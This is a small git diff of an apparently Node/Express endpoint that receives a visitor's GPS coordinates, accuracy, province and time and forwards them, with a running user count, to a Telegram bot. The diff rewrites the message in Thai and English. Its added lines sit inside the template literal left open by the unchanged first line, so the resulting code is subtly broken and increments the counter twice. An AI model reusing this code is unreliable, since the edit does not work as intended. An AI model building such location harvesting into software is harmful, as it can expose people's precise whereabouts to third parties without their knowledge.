@@ -14,11 +14,14 @@ app.post('/save-location', async (req, res) => {
   const { latitude, longitude, accuracy, province, timestamp } = req.body;
   const locationUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
   const message = `📍 User #${userCounter++}
-Province: ${province}
-🌐 Location: ${locationUrl}
-📌 Coordinates: Latitude ${latitude}, Longitude ${longitude}
-📏 Accuracy: ~${accuracy} meters
-🕒 Time: ${new Date(timestamp).toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' })}`;
+const message = `📍 ผู้ใช้งานลำดับที่ #${userCounter++} (User #${userCounter - 1})
+🗺️ จังหวัด (Province): ${province}
+🌐 ตำแหน่ง (Location): ${locationUrl}
+📌 พิกัด (Coordinates):
+   └─ ละติจูด (Latitude): ${latitude}
+   └─ ลองจิจูด (Longitude): ${longitude}
+📏 ความแม่นยำ (Accuracy): ~${accuracy} เมตร (meters)
+🕒 เวลา (Time): ${new Date(timestamp).toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' })}`;
 
   try {
     await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
